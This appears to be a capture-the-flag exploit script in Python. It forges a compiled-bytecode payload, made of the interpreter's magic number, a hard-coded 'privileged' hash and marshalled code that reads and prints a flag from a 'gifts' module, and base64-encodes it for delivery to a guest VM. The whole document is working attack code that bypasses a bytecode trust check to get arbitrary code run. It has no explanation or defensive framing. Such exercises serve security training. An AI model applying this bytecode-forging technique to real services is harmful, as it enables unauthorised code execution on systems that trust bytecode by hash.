import struct
import base64
import marshal
import binascii
import importlib.util

# Grab the magic number of the current interpreter (Must be 3.13!)
magic_number = importlib.util.MAGIC_NUMBER
print("[*] Magic number: ", binascii.hexlify(magic_number))

# Pack the privileged hash (from pypu-privileged.h) 
PYPU_PRIVILEGED_HASH = 0xf0a0101a75bc9dd3
privileged_hash = struct.pack("<Q", PYPU_PRIVILEGED_HASH)

# Exploit code
code_str = "import gifts; print(f'FOUND_FLAG: {gifts.flag}')"
code_obj = compile(code_str, "<string>", "exec")
marshalled_code = marshal.dumps(code_obj)

# [Magic (4b)] + [Flags (4b)] + [Hash (8b)] + [Bytecode (var)]
payload = magic_number + b"\x00\x00\x00\x00" + privileged_hash + marshalled_code

# Output the results for the Guest VM
b64_payload = base64.b64encode(payload).decode()
size = len(payload)

print(f"[*] Payload Size: {size}")
print(f"[*] Base64 payload:\n{b64_payload}")